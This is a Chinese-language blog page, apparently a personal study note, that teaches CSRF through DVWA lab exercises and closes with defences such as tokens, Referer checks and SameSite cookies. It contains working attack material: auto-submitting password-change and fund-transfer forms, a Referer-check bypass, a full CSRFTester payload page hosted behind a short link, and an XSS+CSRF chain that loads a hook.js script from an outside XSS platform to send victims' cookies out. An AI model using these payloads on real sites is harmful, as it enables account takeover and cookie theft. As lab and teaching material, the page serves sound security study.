@@ -1,0 +1,592 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://example.com/2022/05/27/CSRF/">
+
+
+
+  <title>
+CSRF - web安全 |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">CSRF
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-05-27 13:38:45">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-05-27T13:38:45+08:00">2022-05-27</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/CSRF/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf">#</a> CSRF</h1>
+<p><strong>引用自 pikachu 的解释：</strong></p>
+<blockquote>
+<p>CSRF (跨站请求伪造) 概述</p>
+<p>Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 &quot;one click&quot; 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的。<br>
+这里列举一个场景解释一下，希望能够帮助你理解。<br>
+<strong>场景需求：</strong><br>
+小黑想要修改大白在购物网站 tianxiewww.xx.com 上填写的会员地址。<br>
+<strong>先看下大白是如何修改自己的密码的：</strong><br>
+登录 — 修改会员信息，提交请求 — 修改成功。<br>
+所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>
+<p>但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？<br>
+于是他自己跑到 www.xx.com 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：<br>
+【<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL2VkaXQucGhwP2VtYWlsPXhpYW9oZWlAODguY29tJmFtcDtDaGFuZ2U9Q2hhbmdlJUUzJTgwJTkx">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</span><br>
+于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p>
+<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>
+1.www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造；<br>
+— 因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。<br>
+2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上；<br>
+— 如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>
+— 因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。<br>
+当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>
+— 所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。</p>
+<p>因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：<br>
+–对敏感信息的操作增加安全的 token；<br>
+–对敏感信息的操作增加安全的验证码；<br>
+–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
+</blockquote>
+<p>CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作。</p>
+<p>没有对用户合法身份进行验证</p>
+<h2 id="csrf类型"><a class="markdownIt-Anchor" href="#csrf类型">#</a> CSRF 类型</h2>
+<p><strong>GET 类型的 CSRF</strong></p>
+<p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：</p>
+<p><code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>
+<p>在受害者访问这个页面后，浏览器会自动向 <code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code> 发出一次 HTTP 请求。1.1.1.1:18888 就会受到用户修改密码的跨域请求，同时因为用户在 A 页面没有登出，浏览器会携带 A 的 cookie</p>
+<p><strong>POST 类型的 CSRF</strong></p>
+<p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.example/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</p>
+<p><strong>链接类型的 CSRF</strong></p>
+<p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
+<p><code> &lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt;   重磅消息！！   &lt;a/&gt;</code></p>
+<h2 id="dvwa"><a class="markdownIt-Anchor" href="#dvwa">#</a> dvwa</h2>
+<p>1.low</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213100094.png" alt="image-20221029213100094"></p>
+<p>由于我当前已经登录，因此网站中是存在我的 cookie 滴</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213206492.png" alt="image-20221029213206492"></p>
+<p>并且在 low 模式下，没有原密码做验证，也没有 token 对用户身份最校验，那么 csrf 就出现了</p>
+<p>我目前修改自己的密码，从 password 修改为 123456，观察 URL 的变化</p>
+<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code></p>
+<p>网络中有个 hacker，抓到了我修改密码的请求包，意味着他也得到了上述 url，那么他就可以构造以下 url：</p>
+<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>
+<p>然后把它缩短为短链接的形式：</p>
+<p><code>http://gg.gg/12iqj8</code></p>
+<p>我一旦点击后，就会向服务器发送 change password 的请求</p>
+<p>此时我的密码就会被改变</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213847558.png" alt="image-20221029213847558"></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213921662.png" alt="image-20221029213921662"></p>
+<p>2.medium</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if( isset( $_GET[ ‘Change’ ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( eregi( $_SERVER[ ‘SERVER_NAME’ ], $_SERVER[ ‘HTTP_REFERER’ ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new = $_GET[ ‘password_new’ ];</span><br><span class="line">    $pass_conf = $_GET[ ‘password_conf’ ];</span><br></pre></td></tr></table></figure>
+<p>多了判断 HTTP_REFERER 中是否有 SERVER_NAME，HTTP_REFERER 是 Referer 参数值，即来源地址，SERVER_NAME 是 host 参数及主机 ip 名</p>
+<p>其实他是想限制同源，但可以绕过</p>
+<p>同时使用 csrftester 生成 payload，但不一样的是需要修改文件名为 IP.html，比如 192.168.13.133.html，这样在检测 refer 时就会包括了我们的 hostIP，相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HOST: 192.168.13.133</span><br><span class="line">Referer: http://101.1.1.1/dvwa/192.168.13.133.html</span><br></pre></td></tr></table></figure>
+<p>3.high</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if ($change) &#123;</span><br><span class="line">	// Check Anti-CSRF token</span><br><span class="line">	checkToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">	// Do the passwords match?</span><br><span class="line">	if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		// They do!</span><br><span class="line">		$pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		// Update the database</span><br><span class="line">		$insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">		$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class="line"></span><br><span class="line">		// Feedback for the user</span><br><span class="line">		$return_message = &quot;Password Changed.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Issue with passwords matching</span><br><span class="line">		$return_message = &quot;Passwords did not match.&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>攻击思路是试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而获得 token 值，并向服务器发送改密请求，完成攻击。<br>
+但是，浏览器并不允许跨域请求，因此，我们可以利用 xss 漏洞</p>
+<p>我们需要利用 xss 了，打开 stroed xss，构造如下代码 <code>&lt;iframe src=&quot;../csrf/&quot;onload=alert(document.getElementsByName('user_token')[0].value)&gt;&lt;/iframe&gt;</code>  获得 cookie，使用 cookie 完成 csrf</p>
+<p>或者使用 CSRF Token Tracker 的 BP 插件</p>
+<h2 id="csrf-tester"><a class="markdownIt-Anchor" href="#csrf-tester">#</a> CSRF tester</h2>
+<blockquote>
+<p>CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>
+</blockquote>
+<p>CSRF tester 监听 8008 端口，注意设置代理～</p>
+<p><code>10月 29, 2022 9:42:36 下午 org.owasp.webscarab.plugin.proxy.Listener listen 信息: Proxy listening on 127.0.0.1:8008</code></p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214412139.png" alt="image-20221029214412139" style="zoom: 67%;" />
+<p>接着访问可能存在 csrf 的连接～</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214511815.png" alt="image-20221029214511815" style="zoom:80%;" />
+<p>点击 start recording</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214544955.png" alt="image-20221029214544955"></p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215312102.png" alt="image-20221029215312102" style="zoom:80%;" />
+<p>将左侧的参数修改为自己的</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030095527035.png" alt="image-20221030095527035"></p>
+<p>生成 html</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215514582.png" alt="image-20221029215514582" style="zoom:80%;" />
+<p>生成的 payload 如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>OWASP CRSFTester Demonstration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;javascript:fireForms()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JavaScript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pauses = <span class="keyword">new</span> <span class="title class_">Array</span>( <span class="string">&quot;53&quot;</span> );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">pausecomp</span>(<span class="params">millis</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> curDate = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">do</span> &#123; curDate = <span class="keyword">new</span> <span class="title class_">Date</span>(); &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">while</span>(curDate-date &lt; millis);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">fireForms</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> i=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">forms</span>[i].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">pausecomp</span>(pauses[i]);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>OWASP CRSFTester Demonstration<span class="tag">&lt;/<span class="name">H2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form0&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://10.128.50.84:18888/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将它放在我的服务器上： <code>(http://101.35.139.208:9999/shabi233.html)</code></p>
+<p>再以同样的方式生成短链接： <code>http://gg.gg/12ivbn</code></p>
+<p>访问后密码就会被修改</p>
+<h2 id="csrf-防御"><a class="markdownIt-Anchor" href="#csrf-防御">#</a> CSRF 防御</h2>
+<p>1. 在请求地址中添加 token 验证</p>
+<input type="hidden" name="token" value="">
+<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，可以在用户登录后放入 session 中，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
+<p>2. 添加 referer 认证</p>
+<p>如果是以网站 WebA 的网址开头的域名，则说明该请求是来自 WebA 自己的请求，是合法的。</p>
+<p>但 referer 可以伪造</p>
+<p>3. 限制跨域</p>
+<p>阻止不明外域的访问，使用 json api</p>
+<p>使用 JavaScript 发起 AJAX 请求是限制跨域的，并不能通过简单的表单来发送 JSON，所以，通过只接收 JSON 可以很大可能避免 CSRF 攻击。</p>
+<ul>
+<li>同源检测</li>
+<li>Samesite Cookie</li>
+</ul>
+<p>4. 修改密码时需要原密码</p>
+<h2 id="xss-csrf"><a class="markdownIt-Anchor" href="#xss-csrf">#</a> xss + csrf</h2>
+<p>selfxss 就是只能对本地客户端产生影响的跨站脚本攻击，举例简单来说就是像获取到的 cookie 是自己的，显然这并没有什么实际危害，但是一旦结合跨站请求伪造则会导致危害升级，并且成为存储型的跨站脚本攻击。</p>
+<h4 id="stored-xss-csrf"><a class="markdownIt-Anchor" href="#stored-xss-csrf">#</a> stored xss + csrf</h4>
+<p>即同时存在 xss 和 csrf 的地方</p>
+<p>思路是：在 xss 中插入我们构造的 csrf 的恶意代码的连接，一旦用户访问，我们就可以跳转到 csrf 页面干一些见不得人的事</p>
+<p>1. 使用前面提到过的 csrftester 生成一个 payload，放在自己的服务器上，比如我的服务器为 1.1.1.1，生成的 payload 名字是 haha.html，放在网站根目录下，那么此时完整路径为 <code>1.1.1.1/haha.html</code></p>
+<p>2. 在 stroed xss 处插入： <code>&lt;script src=&quot;x&quot; onerror=javascript:window.open(&quot;http://1.1.1.1/haha.html&quot;)&gt;&lt;/script&gt;</code></p>
+<p>3. 用户一旦访问，我们 haha.html 中的 csrf 恶意代码就会被执行</p>
+<h4 id="self-xss-csrf"><a class="markdownIt-Anchor" href="#self-xss-csrf">#</a> self-xss + csrf</h4>
+<p>selfxss 一般只能获取自己的 cookie，但结合 csrf，我们可以获取别人的 cookie。我们在 input 中提交的是 hook.js，用户一旦点击，相当于让别人触发这个 js，cookie 被外带到平台，而 selfxss 则是自己触发 js</p>
+<p>1. 首先准备一个 xss 平台，使用它他提供的 payload： <code>&lt;script src=&quot;http://192.168.38.129:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>2. 使用 csrftester 生成我们的 payload，payload 路径和名称参考前一个 <code>1.1.1.1/haha.html</code> ，但此时 payload 需要做一些修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;GET&quot; name=&quot;form0&quot; action=&quot;http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;/&gt; </span><br></pre></td></tr></table></figure>
+<p>3. 用户登录账户，点击我们的链接，我们就能在 xss 平台看到他的 cookie 了</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly90ZWNoLm1laXR1YW4uY29tLzIwMTgvMTAvMTEvZmUtc2VjdXJpdHktY3NyZi5odG1s">前端安全系列（二）：如何防止 CSRF 攻击？ - 美团技术团队 (meituan.com)</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NDA2OS5odG1s">鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM0MTU5MS5odG1s">CSRF 入门及靶场实战 - FreeBuf 网络安全行业门户</span></p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-10-30 14:16:09" itemprop="dateModified" datetime="2022-10-30T14:16:09+08:00">2022-10-30</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/05/27/CSRF/" title="CSRF">http://example.com/2022/05/27/CSRF/</a>
+  </li>
+  <li class="license">
